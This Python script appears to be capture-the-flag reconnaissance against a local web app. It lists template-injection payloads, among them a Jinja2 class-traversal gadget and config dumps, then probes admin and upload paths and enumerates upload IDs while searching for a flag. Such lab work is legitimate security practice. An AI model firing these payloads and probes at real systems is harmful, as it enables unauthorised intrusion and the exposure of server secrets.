import requests
import base64
import re

base_url = "http://127.0.0.1:32891"

print("[+] Exploring SSTI with the hint pattern...")
# The hint {I'm_a_Script_Kiddie} suggests template syntax

# Let's test SSTI payloads in the comment field on posts
ssti_payloads = [
    # Basic detection
    "{{7*7}}",
    "${7*7}",
    "{{7*'7'}}",
    
    # Jinja2 (Python)
    "{{config}}",
    "{{request}}",
    "{{self}}",
    
    # Try to read files via SSTI
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    
    # Simpler file read attempts
    "{{config.items()}}",
]

# First, let's see if there's a comment submission endpoint
print("\n[+] Checking if we can submit comments...")
resp = requests.get(f"{base_url}/post.php", params={'id': 'ScriptKiddie'})
print(f"ScriptKiddie post length: {len(resp.text)}")

# Look for comment form or submission mechanism
if "comment" in resp.text.lower():
    print("[+] Comment functionality detected in response")
    # Extract form details
    form_match = re.search(r'<form[^>]*>(.*?)</form>', resp.text, re.DOTALL | re.IGNORECASE)
    if form_match:
        print(f"[+] Found form: {form_match.group(0)[:200]}")

# Check if there's a hidden admin area or upload interface
print("\n[+] Looking for upload or admin interfaces...")
admin_paths = [
    "/admin",
    "/admin.php",
    "/upload",
    "/upload.php",
    "/comment",
    "/comment.php",
    "/api/comment",
    "/api/upload",
]

for path in admin_paths:
    resp = requests.get(f"{base_url}{path}")
    if resp.status_code == 200 and len(resp.text) > 50:
        print(f"\n[!] Found: {path}")
        print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
        if len(resp.text) < 1000:
            print(f"Content preview: {resp.text[:300]}")

# Let's also try to enumerate more upload IDs
print("\n[+] Enumerating upload file IDs...")
for i in range(1, 20):
    resp = requests.get(f"{base_url}/post.php", params={'id': f'uploads/{i}'})
    if "Post not found" not in resp.text and len(resp.text) > 50:
        print(f"\n[!] Found: uploads/{i}")
        print(f"Length: {len(resp.text)}")
        if "FLAG{" in resp.text:
            print("[!!!] FLAG FOUND!")
            print(resp.text)
            break
        elif len(resp.text) < 500:
            print(f"Preview: {resp.text[:300]}")

